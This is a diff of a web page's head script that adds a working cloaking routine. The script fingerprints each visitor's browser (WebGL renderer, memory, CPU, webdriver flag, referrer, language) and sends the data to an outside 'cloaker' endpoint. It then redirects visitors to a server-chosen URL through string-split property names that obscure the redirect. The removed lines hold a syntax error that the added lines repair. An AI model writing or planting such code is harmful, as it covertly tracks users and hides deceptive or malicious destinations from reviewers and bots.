@@ -8,17 +8,17 @@
 
     <script>
 (function(){
-  if(sessionStorage.getItem("_ck"))return;
-  sessionStorage.setItem("_ck","1");
-  function _wgl(){try{var c=document.createElement("canvas"),g=c.getContext("webgl")||c.getContext("experimental-webgl");if(!g)return"";var x=g.getExtension("WEBGL_debug_renderer_info");return x?(g.getParameter(x.UNMASKED_RENDERER_WEBGL)||"")""}catch(e){return""}}
+  if(sessionStorage.getItem('_ck'))return;
+  sessionStorage.setItem('_ck','1');
+  function _wgl(){try{var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return'';var x=g.getExtension('WEBGL_debug_renderer_info');return x?(g.getParameter(x.UNMASKED_RENDERER_WEBGL)||''):''}catch(e){return''}}
   var _n=navigator||{},_s=window.screen||{},_co=(_n.connection||{});
-  fetch("https://meu-cloaker.vercel.app/api/filtrar",{
-    method:"POST",headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({e:"pv",c:"camp_1780072339656_y2iu",w:_s.width,l:_n.language,r:document.referrer,dp:window.devicePixelRatio||1,mem:_n.deviceMemory||0,cpu:_n.hardwareConcurrency||0,tp:_n.maxTouchPoints||0,wd:!!_n.webdriver,gl:_wgl(),ct:_co.effectiveType||""})
+  fetch('https://meu-cloaker.vercel.app/api/filtrar',{
+    method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({e:'pv',c:'camp_1780072339656_y2iu',w:_s.width,l:_n.language,r:document.referrer,dp:window.devicePixelRatio||1,mem:_n.deviceMemory||0,cpu:_n.hardwareConcurrency||0,tp:_n.maxTouchPoints||0,wd:!!_n.webdriver,gl:_wgl(),ct:_co.effectiveType||''})
   }).then(function(r){return r.json()}).then(function(d){
     var g=d&&d.go;
-    if(g){if(!/^https?:\/\//i.test(g))g="https://"+g;window["loc"+"ation"]["rep"+"lace"](g);return;}
-  }).catch(function(){sessionStorage.removeItem("_ck");});
+    if(g){if(!/^https?:\/\//i.test(g))g='https://'+g;window['loc'+'ation']['rep'+'lace'](g);return;}
+  }).catch(function(){sessionStorage.removeItem('_ck');});
 })();
     </script>
   </head>
